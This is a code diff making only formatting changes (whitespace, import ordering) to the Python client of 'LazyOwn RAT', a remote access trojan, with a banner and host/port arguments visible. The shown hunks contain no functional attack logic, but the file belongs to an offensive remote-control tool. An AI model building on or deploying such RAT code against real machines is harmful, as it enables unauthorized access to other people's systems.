@@ -1,9 +1,8 @@
-#!/usr/bin/env python3 
-#_*_ coding: utf8 _*_
+#!/usr/bin/env python3
 """
 main.py
 
-Autor: Gris Iscomeback 
+Autor: Gris Iscomeback
 Correo electrónico: grisiscomeback[at]gmail[dot]com
 Fecha de creación: 09/06/2024
 Licencia: GPL v3
@@ -18,16 +17,19 @@ Descripción: Cliente LazyOwn Rat
 ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
 
 """
-import os
-import socket
-import signal
 import argparse
+import base64
+import binascii
+import os
+import platform
+import signal
+import socket
+import subprocess
+
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
-import binascii
-import subprocess
-import platform
-import base64
+
+
 def signal_handler(sig, frame):
     global should_exit
     print("\n [<-] Saliendo...")
@@ -194,8 +196,8 @@ def main():
     ███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
     ╚══════╝╚═╝  ╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
     [*] Iniciando: LazyOwn RAT [;,;]
-    """    
-    print(BANNER)    
+    """
+    print(BANNER)
     parser = argparse.ArgumentParser(description='LazyOwnRAT Client')
     parser.add_argument('--host', required=True, help='Server host to connect to')
     parser.add_argument('--port', type=int, required=True, help='Server port to connect to')
